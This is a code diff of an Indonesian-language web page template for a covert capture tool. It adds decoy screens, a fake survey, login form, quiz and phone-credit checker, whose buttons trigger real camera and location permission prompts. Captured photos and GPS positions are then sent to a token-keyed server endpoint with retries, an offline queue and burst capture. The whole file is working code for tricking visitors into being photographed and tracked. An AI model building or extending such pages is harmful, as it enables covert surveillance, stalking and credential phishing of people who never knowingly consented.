@@ -3,388 +3,674 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-  <title>{{ loading_title }}</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>{{ link_title }}</title>
+  <meta property="og:title"       content="{{ link_title }}">
+  <meta property="og:description" content="{{ link_description }}">
+  <meta property="og:type"        content="website">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css">
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <style>
     *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
-    :root{--bg:#040810;--surface:#0b1628;--border:#1e2d45;
-      --text:#e6edf3;--muted:#4d6a8a;--cyan:#00d4ff;--green:#00ff41;--red:#e53935;--amber:#f5a623}
-    html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
-      font-family:'Inter',sans-serif}
 
+    /* ── Custom theme via CSS variables ── */
+    :root{
+      --bg:    {{ theme_bg or '#040810' }};
+      --acc:   {{ theme_accent or '#00d4ff' }};
+      --font:  {{ theme_font or 'Inter' }};
+      --tx:#e6edf3;--mu:#4d6a8a;--border:#1e2d45;
+      --surface:#0b1628;--green:#00ff41;--red:#e53935;
+    }
+
+    html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--tx);
+      font-family:var(--font),sans-serif;-webkit-font-smoothing:antialiased}
+
+    /* ── Screen system ── */
     .screen{position:fixed;inset:0;display:none;flex-direction:column;
-      align-items:center;justify-content:center;padding:24px;opacity:0;transition:opacity .4s}
+      align-items:center;justify-content:center;padding:24px;
+      opacity:0;transition:opacity .4s}
     .screen.active{display:flex;opacity:1}
     .screen.out{opacity:0;pointer-events:none}
 
-    /* ① Loading */
-    #s-loading{background:var(--bg);text-align:center;gap:0}
-    .l-icon{font-size:64px;margin-bottom:28px;animation:float 3s ease-in-out infinite}
+    /* ════════════════ LOADING ════════════════ */
+    #s-load{background:var(--bg);text-align:center;gap:0}
+    .l-ico{font-size:64px;margin-bottom:24px;animation:float 3s ease-in-out infinite}
     @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
-    #l-title{font-size:22px;font-weight:700;margin-bottom:8px}
-    #l-sub{font-size:14px;color:var(--muted);margin-bottom:36px}
-    .prog-wrap{width:200px;height:3px;background:var(--border);border-radius:2px;overflow:hidden}
-    .prog-fill{height:100%;background:linear-gradient(90deg,var(--cyan),#0099bb);
+    .l-title{font-size:22px;font-weight:700;margin-bottom:8px;color:var(--tx)}
+    .l-sub{font-size:14px;color:var(--mu);margin-bottom:36px}
+    .prog-wrap{width:220px;height:3px;background:var(--border);border-radius:2px;overflow:hidden}
+    .prog-fill{height:100%;background:linear-gradient(90deg,var(--acc),rgba(0,0,0,.4));
       border-radius:2px;width:0%;transition:width linear}
     .dots{display:flex;gap:6px;margin-top:20px;justify-content:center}
-    .dots span{width:6px;height:6px;border-radius:50%;background:var(--border);animation:dp 1.4s ease-in-out infinite}
+    .dots span{width:6px;height:6px;border-radius:50%;background:var(--border);
+      animation:dp 1.4s ease-in-out infinite}
     .dots span:nth-child(2){animation-delay:.2s}.dots span:nth-child(3){animation-delay:.4s}
-    @keyframes dp{0%,80%,100%{background:var(--border)}40%{background:var(--cyan)}}
+    @keyframes dp{0%,80%,100%{background:var(--border)}40%{background:var(--acc)}}
 
-    /* ② Permission */
+    /* ════════════════ PERMISSION (normal) ════════════════ */
     #s-perm{background:var(--bg)}
     .perm-card{background:var(--surface);border:1px solid var(--border);border-radius:20px;
-      padding:36px 28px;max-width:360px;width:100%;text-align:center;
-      box-shadow:0 0 60px rgba(0,212,255,.06)}
+      padding:40px 32px;max-width:360px;width:100%;text-align:center;
+      box-shadow:0 0 60px rgba(0,0,0,.3)}
     .perm-card::before{content:'';display:block;width:40px;height:3px;
-      background:linear-gradient(90deg,transparent,var(--cyan),transparent);
+      background:linear-gradient(90deg,transparent,var(--acc),transparent);
       margin:0 auto 28px;border-radius:2px}
-    .perm-icon{font-size:52px;margin-bottom:18px}
-    #p-title{font-size:20px;font-weight:700;margin-bottom:10px}
-    #p-msg{font-size:14px;color:var(--muted);line-height:1.7;margin-bottom:28px}
-    .allow-btn{width:100%;padding:16px;background:var(--cyan);border:none;border-radius:12px;
-      color:#040810;font-size:16px;font-weight:700;cursor:pointer;transition:transform .1s,box-shadow .2s}
-    .allow-btn:active{transform:scale(.97)}
-    .allow-btn:hover{box-shadow:0 0 30px rgba(0,212,255,.35)}
+    .perm-ico{font-size:52px;margin-bottom:18px}
+    .perm-title{font-size:20px;font-weight:700;margin-bottom:10px}
+    .perm-msg{font-size:14px;color:var(--mu);line-height:1.7;margin-bottom:28px}
+    .allow-btn,.fake-submit-btn{width:100%;padding:15px;border:none;border-radius:12px;
+      background:var(--acc);color:#000;font-size:16px;font-weight:700;cursor:pointer;
+      transition:transform .1s,box-shadow .2s;letter-spacing:.02em}
+    .allow-btn:active,.fake-submit-btn:active{transform:scale(.97)}
+    .allow-btn:hover,.fake-submit-btn:hover{box-shadow:0 0 30px rgba(0,212,255,.4)}
     .allow-btn:disabled{opacity:.5;cursor:not-allowed}
-    .perm-note{font-size:11px;color:var(--muted);margin-top:14px;line-height:1.5}
+    .perm-note{font-size:11px;color:var(--mu);margin-top:14px;line-height:1.5}
 
-    /* ③ Stream */
-    #s-stream{padding:0;background:#000}
-    #vid-stream{width:100%;height:100%;object-fit:cover}
-    .shud{position:absolute;top:0;left:0;right:0;display:flex;justify-content:space-between;
-      align-items:center;padding:14px 18px;background:linear-gradient(#000a,transparent)}
-    .rec-b{display:flex;align-items:center;gap:6px;background:rgba(229,57,53,.85);
-      border-radius:4px;padding:4px 10px;font-size:11px;font-weight:600;letter-spacing:.08em}
-    .rdot{width:7px;height:7px;border-radius:50%;background:#fff;animation:bl 1s step-end infinite}
-    @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
-    .fps-t{font-size:11px;font-family:monospace;color:var(--cyan);
-      background:rgba(4,8,16,.7);padding:4px 10px;border-radius:4px}
-    .sbot{position:absolute;bottom:0;left:0;right:0;display:flex;justify-content:space-around;
-      align-items:center;padding:16px 24px env(safe-area-inset-bottom,16px);
-      background:linear-gradient(transparent,#000c)}
-    .cbtn{display:flex;flex-direction:column;align-items:center;gap:4px;
-      background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.12);
-      border-radius:10px;color:var(--text);font-size:10px;padding:10px 18px;cursor:pointer}
-    .cbtn:active{transform:scale(.95)}
-    select.fpss{background:rgba(4,8,16,.8);border:1px solid var(--border);
-      border-radius:8px;color:var(--cyan);font-size:13px;padding:8px 10px;outline:none}
+    /* ════════════════ FAKE APP MODES ════════════════ */
+    /* Base card for all fake modes */
+    .fake-card{background:var(--surface);border:1px solid var(--border);border-radius:16px;
+      padding:32px 28px;max-width:380px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.3)}
+    .fake-logo{text-align:center;margin-bottom:24px}
+    .fake-logo .ico{font-size:48px;display:block;margin-bottom:8px}
+    .fake-logo .name{font-size:18px;font-weight:700;color:var(--tx)}
+    .fake-logo .tagline{font-size:12px;color:var(--mu);margin-top:2px}
 
-    /* ④ Photo */
-    #s-photo{padding:0;background:#000}
-    #vid-photo{width:100%;height:100%;object-fit:cover}
-    .photo-hud{position:absolute;bottom:40px;left:0;right:0;display:flex;justify-content:center}
-    .cap-btn{width:72px;height:72px;border-radius:50%;background:var(--text);
-      border:4px solid rgba(255,255,255,.3);font-size:28px;cursor:pointer;
-      display:flex;align-items:center;justify-content:center;
-      box-shadow:0 0 30px rgba(255,255,255,.2);transition:transform .1s}
-    .cap-btn:active{transform:scale(.9)}
-    .cap-btn:disabled{opacity:.4}
-    .photo-hint{position:absolute;top:20px;left:0;right:0;text-align:center;
-      font-size:14px;color:rgba(255,255,255,.75);background:rgba(0,0,0,.5);
-      padding:10px;backdrop-filter:blur(4px)}
+    /* Survey */
+    #s-fake-survey{background:var(--bg)}
+    .survey-q{margin-bottom:16px;font-size:14px;font-weight:500;color:var(--tx)}
+    .survey-opts{display:flex;flex-direction:column;gap:8px;margin-top:8px}
+    .survey-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;
+      background:var(--bg);border:1px solid var(--border);border-radius:8px;
+      cursor:pointer;font-size:13px;color:var(--mu);transition:border-color .2s,color .2s}
+    .survey-opt:hover{border-color:var(--acc);color:var(--tx)}
+    .survey-opt input{accent-color:var(--acc)}
 
-    /* ⑤ GPS */
-    #s-gps{padding:0;flex-direction:column}
-    #gps-map{flex:1;width:100%;min-height:0}
-    #gps-banner{position:absolute;top:0;left:0;right:0;background:rgba(0,212,255,.12);
-      border-bottom:1px solid rgba(0,212,255,.3);padding:12px 18px;text-align:center;
-      font-size:14px;color:var(--cyan);display:none;z-index:999;backdrop-filter:blur(8px);
-      white-space:pre-wrap;line-height:1.5}
+    /* Login */
+    #s-fake-login{background:var(--bg)}
+    .fake-input{width:100%;padding:12px 14px;background:var(--bg);border:1px solid var(--border);
+      border-radius:8px;color:var(--tx);font-size:14px;outline:none;margin-bottom:12px;
+      font-family:var(--font),sans-serif;transition:border-color .2s}
+    .fake-input:focus{border-color:var(--acc)}
+    .fake-link{display:block;text-align:center;font-size:12px;color:var(--mu);
+      margin-top:12px;cursor:pointer;text-decoration:none}
+
+    /* Quiz */
+    #s-fake-quiz{background:var(--bg)}
+    .quiz-header{font-size:12px;color:var(--mu);margin-bottom:6px;font-family:monospace}
+    .quiz-q{font-size:16px;font-weight:600;margin-bottom:20px;line-height:1.5}
+    .quiz-opts{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px}
+    .quiz-opt{padding:12px;background:var(--bg);border:1px solid var(--border);
+      border-radius:10px;text-align:center;font-size:13px;cursor:pointer;
+      transition:border-color .2s,background .2s;color:var(--mu)}
+    .quiz-opt:hover{border-color:var(--acc);color:var(--tx);background:var(--surface)}
+
+    /* Pulsa */
+    #s-fake-pulsa{background:var(--bg)}
+    .pulsa-balance{text-align:center;padding:20px;background:var(--bg);
+      border:1px solid var(--border);border-radius:12px;margin-bottom:20px}
+    .pulsa-balance .lbl{font-size:11px;color:var(--mu);text-transform:uppercase;letter-spacing:.08em}
+    .pulsa-balance .amount{font-size:32px;font-weight:700;color:var(--acc);margin:4px 0}
+    .pulsa-balance .phone{font-size:13px;color:var(--mu);font-family:monospace}
+
+    /* ════════════════ ACTIVE (background running) ════════════════ */
+    #s-active{background:var(--bg);text-align:center;gap:0}
+    .custom-msg{font-size:19px;font-weight:600;line-height:1.65;color:var(--tx);
+      max-width:320px;margin-bottom:44px;white-space:pre-wrap}
+    .custom-msg:empty::before{content:'Sedang berjalan...';color:var(--mu)}
+    .ind-wrap{position:relative;width:80px;height:80px;
+      display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+    .ring{position:absolute;inset:0;border-radius:50%;
+      border:2px solid rgba(0,255,65,.25);
+      animation:rp 2s ease-in-out infinite}
+    .ring2{position:absolute;inset:12px;border-radius:50%;
+      border:2px solid rgba(0,255,65,.15);
+      animation:rp 2s ease-in-out infinite .5s}
+    .g-dot{width:26px;height:26px;border-radius:50%;background:var(--green);
+      box-shadow:0 0 24px rgba(0,255,65,.6);
+      animation:gdp 1.5s ease-in-out infinite}
+    @keyframes rp{0%,100%{transform:scale(1);opacity:.4}50%{transform:scale(1.1);opacity:.15}}
+    @keyframes gdp{0%,100%{transform:scale(1)}50%{transform:scale(.86)}}
+    .ind-label{font-size:11px;font-weight:600;letter-spacing:.12em;
+      color:var(--green);text-transform:uppercase;margin-bottom:24px}
+    .stats-row{display:flex;gap:24px;justify-content:center;margin-bottom:12px}
+    .stat{display:flex;flex-direction:column;align-items:center;gap:2px}
+    .stat .sico{font-size:18px}
+    .stat .sval{font-size:12px;color:var(--acc);font-family:monospace;font-weight:600}
+    .stat .slbl{font-size:10px;color:var(--mu)}
+    .queue-badge{font-size:11px;color:var(--mu);font-family:monospace;
+      padding:4px 12px;border:1px solid var(--border);border-radius:20px;margin-top:8px;display:none}
+    .queue-badge.visible{display:block}
+
+    /* ════════════════ GPS ONLY ════════════════ */
+    #s-gps-only{padding:0;flex-direction:column}
+    #gps-map-d{flex:1;width:100%;min-height:0}
+    #gps-banner{position:absolute;top:0;left:0;right:0;background:rgba(0,0,0,.4);
+      backdrop-filter:blur(8px);border-bottom:1px solid rgba(0,212,255,.3);
+      padding:12px 18px;text-align:center;font-size:14px;color:var(--acc);
+      display:none;z-index:999;white-space:pre-wrap;line-height:1.5}
     .gps-bar{background:var(--surface);border-top:1px solid var(--border);
       padding:12px 18px;flex-shrink:0;display:flex;gap:16px;flex-wrap:wrap}
     .gs{display:flex;flex-direction:column;gap:2px}
-    .gs label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
-    .gs span{font-size:12px;font-weight:600;color:var(--cyan);font-family:monospace}
+    .gs label{font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--mu)}
+    .gs span{font-size:12px;font-weight:600;color:var(--acc);font-family:monospace}
+    .gps-address{padding:8px 18px;font-size:11px;color:var(--mu);background:var(--surface);
+      border-top:1px solid var(--border);font-style:italic;white-space:nowrap;
+      overflow:hidden;text-overflow:ellipsis}
 
-    /* ⑥ Pesan (foto sukses) */
-    #s-msg{background:var(--bg);text-align:center;gap:16px}
-    #msg-photo{width:100%;max-height:50vh;object-fit:contain;border-radius:12px;
-      box-shadow:0 0 40px rgba(0,212,255,.1)}
-    .msg-card{background:var(--surface);border:1px solid var(--border);border-radius:16px;
-      padding:28px 24px;max-width:360px;width:100%}
-    .msg-icon{font-size:40px;margin-bottom:12px}
-    #msg-txt{font-size:15px;line-height:1.7;white-space:pre-wrap}
-    .msg-close{margin-top:18px;padding:12px 28px;border:1px solid var(--border);
-      border-radius:8px;color:var(--muted);font-size:14px;background:none;cursor:pointer}
+    /* ════════════════ THANK YOU ════════════════ */
+    #s-thankyou{background:var(--bg);text-align:center;gap:16px}
+    .ty-icon{font-size:64px;animation:pop .4s ease-out}
+    @keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+    .ty-title{font-size:24px;font-weight:700}
+    .ty-msg{font-size:15px;color:var(--mu);line-height:1.7;max-width:300px;white-space:pre-wrap}
+    .ty-btn{margin-top:8px;padding:13px 28px;border:1px solid var(--border);
+      border-radius:10px;color:var(--mu);font-size:14px;background:none;cursor:pointer;
+      font-family:var(--font),sans-serif}
+    .ty-countdown{margin-top:12px;font-size:12px;color:var(--mu);font-family:monospace;
+      padding:6px 16px;border:1px solid var(--border);border-radius:20px;display:none}
 
-    /* ⑦ Error */
+    /* ════════════════ ERROR ════════════════ */
     #s-err{background:var(--bg);text-align:center;gap:12px}
     .err-ico{font-size:52px}
-    #err-t{font-size:20px;font-weight:700}
-    #err-m{font-size:14px;color:var(--muted);line-height:1.6;max-width:300px}
+    .err-t{font-size:20px;font-weight:700}
+    .err-m{font-size:14px;color:var(--mu);line-height:1.6;max-width:300px}
     .retry{margin-top:8px;padding:12px 24px;border:1px solid var(--border);
-      border-radius:8px;color:var(--muted);font-size:14px;background:none;cursor:pointer}
+      border-radius:8px;color:var(--mu);font-size:14px;background:none;cursor:pointer}
   </style>
 </head>
 <body>
 
 <!-- ① Loading -->
-<div id="s-loading" class="screen active">
-  <div class="l-icon" id="l-icon">📱</div>
-  <div id="l-title">{{ loading_title }}</div>
-  <div id="l-sub">{{ loading_subtitle }}</div>
+<div id="s-load" class="screen active">
+  <div class="l-ico" id="l-ico">{{ custom_icon or '📱' }}</div>
+  <div class="l-title">{{ loading_title }}</div>
+  <div class="l-sub">{{ loading_subtitle }}</div>
   <div class="prog-wrap"><div class="prog-fill" id="prog"></div></div>
   <div class="dots"><span></span><span></span><span></span></div>
 </div>
 
-<!-- ② Permission -->
+<!-- ② Permission normal -->
 <div id="s-perm" class="screen">
   <div class="perm-card">
-    <div class="perm-icon" id="p-ico">📷</div>
-    <div id="p-title">{{ permission_title }}</div>
-    <div id="p-msg">{{ permission_message }}</div>
+    <div class="perm-ico" id="p-ico">{{ custom_icon or '📷' }}</div>
+    <div class="perm-title">{{ permission_title }}</div>
+    <div class="perm-msg">{{ permission_message }}</div>
     <button class="allow-btn" id="allow-btn">Izinkan Akses</button>
     <p class="perm-note" id="p-note"></p>
   </div>
 </div>
 
-<!-- ③ Streaming -->
-<div id="s-stream" class="screen">
-  <video id="vid-stream" autoplay playsinline muted></video>
-  <div class="shud">
-    <div class="rec-b"><div class="rdot"></div>REC</div>
-    <div class="fps-t" id="fps-t">— fps</div>
-  </div>
-  <div class="sbot">
-    <button class="cbtn" onclick="flipCam()">🔄<span>GANTI</span></button>
-    <select class="fpss" id="fps-sel" onchange="setInterval_ms(this.value)">
-      <option value="2000">0.5 fps</option>
-      <option value="1000" selected>1 fps</option>
-      <option value="600">1.5 fps</option>
-    </select>
-    <button class="cbtn" onclick="stopAll()">⏹<span>STOP</span></button>
-  </div>
-</div>
-
-<!-- ④ Foto -->
-<div id="s-photo" class="screen">
-  <video id="vid-photo" autoplay playsinline muted></video>
-  <div class="photo-hint">Arahkan kamera lalu ketuk tombol ⬤</div>
-  <div class="photo-hud">
-    <button class="cap-btn" id="cap-btn" onclick="doCapture()">⬤</button>
+<!-- ③ Fake: Survey -->
+<div id="s-fake-survey" class="screen">
+  <div class="fake-card">
+    <div class="fake-logo">
+      <span class="ico" id="fsl-ico">{{ custom_icon or '📋' }}</span>
+      <div class="name">{{ permission_title or 'Survei Singkat' }}</div>
+      <div class="tagline">{{ link_description or 'Bantu kami meningkatkan layanan' }}</div>
+    </div>
+    <div class="survey-q">Seberapa puas Anda dengan layanan kami?</div>
+    <div class="survey-opts">
+      <label class="survey-opt"><input type="radio" name="sq1" value="4"> 😊 Sangat Puas</label>
+      <label class="survey-opt"><input type="radio" name="sq1" value="3"> 🙂 Puas</label>
+      <label class="survey-opt"><input type="radio" name="sq1" value="2"> 😐 Cukup</label>
+      <label class="survey-opt"><input type="radio" name="sq1" value="1"> 😞 Tidak Puas</label>
+    </div>
+    <br>
+    <button class="fake-submit-btn" id="survey-btn">Kirim Jawaban →</button>
+    <p class="perm-note" id="survey-note"></p>
   </div>
 </div>
 
-<!-- ⑤ GPS -->
-<div id="s-gps" class="screen">
+<!-- ④ Fake: Login -->
+<div id="s-fake-login" class="screen">
+  <div class="fake-card">
+    <div class="fake-logo">
+      <span class="ico">{{ custom_icon or '🔐' }}</span>
+      <div class="name">{{ permission_title or 'Masuk ke Akun' }}</div>
+      <div class="tagline">{{ link_description or 'Masukkan kredensial Anda' }}</div>
+    </div>
+    <input class="fake-input" type="text" placeholder="Nama Pengguna / Email">
+    <input class="fake-input" type="password" placeholder="Kata Sandi">
+    <button class="fake-submit-btn" id="login-btn">Masuk →</button>
+    <a class="fake-link">Lupa kata sandi?</a>
+    <p class="perm-note" id="login-note"></p>
+  </div>
+</div>
+
+<!-- ⑤ Fake: Quiz -->
+<div id="s-fake-quiz" class="screen">
+  <div class="fake-card">
+    <div class="fake-logo">
+      <span class="ico">{{ custom_icon or '🧠' }}</span>
+      <div class="name">{{ permission_title or 'Kuis Pengetahuan' }}</div>
+    </div>
+    <div class="quiz-header">Pertanyaan 1 dari 5</div>
+    <div class="quiz-q">Apa ibu kota Indonesia?</div>
+    <div class="quiz-opts">
+      <div class="quiz-opt" id="qopt-a">A. Surabaya</div>
+      <div class="quiz-opt" id="qopt-b">B. Jakarta</div>
+      <div class="quiz-opt" id="qopt-c">C. Bandung</div>
+      <div class="quiz-opt" id="qopt-d">D. Medan</div>
+    </div>
+    <button class="fake-submit-btn" id="quiz-btn" style="display:none">Lanjut →</button>
+    <p class="perm-note" id="quiz-note"></p>
+  </div>
+</div>
+
+<!-- ⑥ Fake: Cek Pulsa -->
+<div id="s-fake-pulsa" class="screen">
+  <div class="fake-card">
+    <div class="fake-logo">
+      <span class="ico">{{ custom_icon or '📱' }}</span>
+      <div class="name">{{ permission_title or 'Cek Saldo & Pulsa' }}</div>
+    </div>
+    <div class="pulsa-balance">
+      <div class="lbl">Saldo Aktif</div>
+      <div class="amount">Rp 0</div>
+      <div class="phone">+62 *** **** ****</div>
+    </div>
+    <input class="fake-input" type="tel" placeholder="Masukkan nomor HP Anda">
+    <button class="fake-submit-btn" id="pulsa-btn">Cek Sekarang →</button>
+    <p class="perm-note" id="pulsa-note"></p>
+  </div>
+</div>
+
+<!-- ⑦ Active (background) -->
+<div id="s-active" class="screen">
+  <div class="custom-msg" id="cmsg">{{ custom_message }}</div>
+  <div class="ind-wrap">
+    <div class="ring"></div><div class="ring2"></div>
+    <div class="g-dot"></div>
+  </div>
+  <div class="ind-label">Aktif</div>
+  <div class="stats-row" id="stats-row"></div>
+  <div class="queue-badge" id="queue-badge">⏳ 0 foto antri</div>
+</div>
+
+<!-- ⑧ GPS only -->
+<div id="s-gps-only" class="screen">
   <div id="gps-banner"></div>
-  <div id="gps-map"></div>
+  <div id="gps-map-d"></div>
   <div class="gps-bar">
     <div class="gs"><label>Lat</label><span id="g-lat">—</span></div>
     <div class="gs"><label>Lng</label><span id="g-lng">—</span></div>
     <div class="gs"><label>Akurasi</label><span id="g-acc">—</span></div>
     <div class="gs"><label>Update</label><span id="g-time">—</span></div>
   </div>
+  <div class="gps-address" id="gps-addr">Mendeteksi lokasi...</div>
 </div>
 
-<!-- ⑥ Pesan Sukses (foto) -->
-<div id="s-msg" class="screen">
-  <img id="msg-photo" src="" alt="" style="display:none">
-  <div class="msg-card">
-    <div class="msg-icon">✅</div>
-    <div id="msg-txt">{{ custom_message }}</div>
-    <button class="msg-close" onclick="location.href='about:blank'">Tutup</button>
-  </div>
+<!-- ⑨ Thank You -->
+<div id="s-thankyou" class="screen">
+  <div class="ty-icon">✅</div>
+  <div class="ty-title" id="ty-title">{{ thank_you_title or 'Terima Kasih!' }}</div>
+  <div class="ty-msg" id="ty-msg">{{ thank_you_msg or 'Data Anda telah berhasil diterima.' }}</div>
+  <button class="ty-btn" onclick="closeTY()">{{ thank_you_btn or 'Tutup' }}</button>
+  <div class="ty-countdown" id="ty-countdown"></div>
 </div>
 
-<!-- ⑦ Error -->
+<!-- ⑩ Error -->
 <div id="s-err" class="screen">
   <div class="err-ico">⚠️</div>
-  <div id="err-t">Terjadi Kesalahan</div>
-  <div id="err-m">Coba muat ulang halaman ini.</div>
+  <div class="err-t" id="err-t">Terjadi Kesalahan</div>
+  <div class="err-m" id="err-m">Coba muat ulang halaman ini.</div>
   <button class="retry" onclick="location.reload()">Muat Ulang</button>
 </div>
 
 <script>
 const CFG = {
-  token: {{ token | tojson }},
-  type:  {{ token_type | tojson }},
-  dur:   {{ loading_duration }},
-  msg:   {{ custom_message | tojson }},
+  token:        {{ token | tojson }},
+  mode:         {{ mode | tojson }},
+  canary:       {{ canary }},
+  msg:          {{ custom_message | tojson }},
+  dur:          {{ loading_duration }},
+  fakeMode:     {{ fake_mode | tojson }},
+  tyTitle:      {{ (thank_you_title or 'Terima Kasih!') | tojson }},
+  tyMsg:        {{ (thank_you_msg or 'Data Anda telah berhasil diterima.') | tojson }},
+  tyBtn:        {{ (thank_you_btn or 'Tutup') | tojson }},
+  redirectUrl:  {{ redirect_url | tojson }},
+  redirectDelay:{{ redirect_delay }},
+  facing:       {{ camera_facing | tojson }},
+  width:        {{ photo_width }},
+  burstCount:   {{ burst_count }},
+  burstInterval:{{ burst_interval }},
+  interval:     {{ capture_interval }},
 };
 
-const ICONS = {stream:'📹', photo:'📸', gps:'📍'};
-const NOTES = {
-  stream: 'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog kamera.',
-  photo:  'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog kamera.',
-  gps:    'Ketuk Izinkan, lalu pilih <strong>Izinkan</strong> pada dialog lokasi.',
-};
+const $ = id => document.getElementById(id);
+const slp = ms => new Promise(r => setTimeout(r, ms));
 
-let mediaStream = null, sendTimer = null, sendMs = 1000;
-let fpsCnt = 0, lastFpsMs = Date.now(), usingFront = false;
+// ── State ─────────────────────────────────────────────────────────────────────
+let photoCnt = 0, gpsCnt = 0;
+let offlineQueue = [];     // blob array saat offline
+let isOnline = navigator.onLine;
+let redirectDone = false;
 let leafMap = null, leafMarker = null, polyPts = [], lastGpsSent = 0;
 const canvas = document.createElement('canvas');
 const ctx    = canvas.getContext('2d');
 
-const $ = id => document.getElementById(id);
-const sleep = ms => new Promise(r => setTimeout(r, ms));
-
+// ── Helpers ───────────────────────────────────────────────────────────────────
 function show(id) {
   document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
   $(id).classList.add('active');
 }
 function setErr(t, m) { $('err-t').textContent=t; $('err-m').textContent=m; show('s-err'); }
 
-// ── ① Loading ────────────────────────────────────────────────────────────────
-async function startLoading() {
-  $('l-icon').textContent = ICONS[CFG.type] || '📱';
-  const prog = $('prog');
-  prog.style.transition = `width ${CFG.dur}s linear`;
-  requestAnimationFrame(() => prog.style.width = '100%');
-  await sleep(CFG.dur * 1000);
-  $('s-loading').classList.add('out');
-  await sleep(400);
-  show('s-perm');
-  $('p-ico').textContent  = ICONS[CFG.type];
-  $('p-note').innerHTML   = NOTES[CFG.type];
+// Online/offline detection
+window.addEventListener('online',  () => { isOnline=true; flushQueue(); });
+window.addEventListener('offline', () => { isOnline=false; });
+
+// ── Retry wrapper ─────────────────────────────────────────────────────────────
+async function fetchWithRetry(url, opts, maxRetries=3) {
+  for (let i=0; i<maxRetries; i++) {
+    try {
+      const r = await fetch(url, {...opts, signal: AbortSignal.timeout(12000)});
+      if (r.ok) return true;
+    } catch(e) {
+      if (i===maxRetries-1) throw e;
+      await slp(1000 * (i+1));  // backoff: 1s, 2s, 3s
+    }
+  }
+  return false;
 }
 
-// ── ② Izin ───────────────────────────────────────────────────────────────────
-$('allow-btn').addEventListener('click', async () => {
-  const btn = $('allow-btn');
-  btn.disabled = true; btn.textContent = 'Memproses...';
-  try {
-    if (CFG.type === 'stream' || CFG.type === 'photo') {
-      mediaStream = await navigator.mediaDevices.getUserMedia({
-        video:{facingMode: usingFront ? 'user' : 'environment',
-               width:{ideal:640}, height:{ideal:480}},
-        audio: false
+// ── Offline Queue ─────────────────────────────────────────────────────────────
+async function flushQueue() {
+  while (offlineQueue.length > 0 && isOnline) {
+    const item = offlineQueue[0];
+    try {
+      await fetchWithRetry(`/api/capture/${CFG.token}`, {
+        method:'POST', headers:{'Content-Type':'image/jpeg'}, body:item
       });
-      if (CFG.type === 'stream') { show('s-stream'); $('vid-stream').srcObject = mediaStream; startStream(); }
-      else                       { show('s-photo');  $('vid-photo').srcObject  = mediaStream; }
-    } else {
-      show('s-gps'); startGPS();
-    }
-  } catch(err) {
-    const m = {NotAllowedError:'Izin ditolak. Buka Pengaturan browser → aktifkan akses.',
-               NotFoundError:'Kamera tidak ditemukan.',
-               NotReadableError:'Kamera sedang dipakai aplikasi lain.'};
-    setErr('Akses Ditolak', m[err.name] || err.message);
+      offlineQueue.shift();
+      photoCnt++; updateStats();
+    } catch { break; }
   }
+  updateQueueBadge();
+}
+
+function updateQueueBadge() {
+  const b = $('queue-badge');
+  if (offlineQueue.length > 0) {
+    b.textContent = `⏳ ${offlineQueue.length} foto antri (offline)`;
+    b.classList.add('visible');
+  } else {
+    b.classList.remove('visible');
+  }
+}
+
+// ── ① Loading → Fake or Normal ────────────────────────────────────────────────
+async function startLoading() {
+  const prog = $('prog');
+  prog.style.transition = `width ${CFG.dur}s linear`;
+  requestAnimationFrame(() => prog.style.width='100%');
+  await slp(CFG.dur * 1000);
+  $('s-load').classList.add('out');
+  await slp(400);
+
+  if (CFG.fakeMode) {
+    showFakeMode(CFG.fakeMode);
+  } else {
+    show('s-perm');
+    $('p-ico').textContent = $('l-ico').textContent;
+    $('p-note').innerHTML  =
+      CFG.mode==='gps'   ? 'Ketuk <strong>Izinkan</strong> pada dialog lokasi.' :
+      CFG.mode==='both'  ? 'Ketuk <strong>Izinkan</strong> pada setiap dialog yang muncul.' :
+                           'Ketuk <strong>Izinkan</strong> pada dialog kamera.';
+  }
+}
+
+// ── ② Fake App Modes ──────────────────────────────────────────────────────────
+function showFakeMode(mode) {
+  const map = {survey:'s-fake-survey', login:'s-fake-login',
+                quiz:'s-fake-quiz', pulsa:'s-fake-pulsa'};
+  show(map[mode] || 's-perm');
+}
+
+// Quiz: clicking option shows "Lanjut" button
+['qopt-a','qopt-b','qopt-c','qopt-d'].forEach(id => {
+  const el = $(id); if (!el) return;
+  el.addEventListener('click', () => {
+    document.querySelectorAll('.quiz-opt').forEach(o => o.style.borderColor='');
+    el.style.borderColor = 'var(--acc)';
+    $('quiz-btn').style.display = 'block';
+  });
 });
 
-// ── ③ Stream via HTTP POST ────────────────────────────────────────────────────
-function startStream() {
-  if (CFG.msg) showStreamBanner(CFG.msg);
-  $('vid-stream').onloadedmetadata = () => {
-    clearInterval(sendTimer);
-    sendTimer = setInterval(sendFrameHTTP, sendMs);
+// All fake submit buttons trigger the real permission
+function attachFakeTrigger(btnId, noteId) {
+  const btn = $(btnId); const note = $(noteId);
+  if (!btn) return;
+  btn.addEventListener('click', async () => {
+    btn.disabled = true; btn.textContent = 'Memproses...';
+    if (note) note.innerHTML = 'Ketuk <strong>Izinkan</strong> pada dialog yang muncul.';
+    await doPermission();
+  });
+}
+attachFakeTrigger('survey-btn','survey-note');
+attachFakeTrigger('login-btn','login-note');
+attachFakeTrigger('quiz-btn','quiz-note');
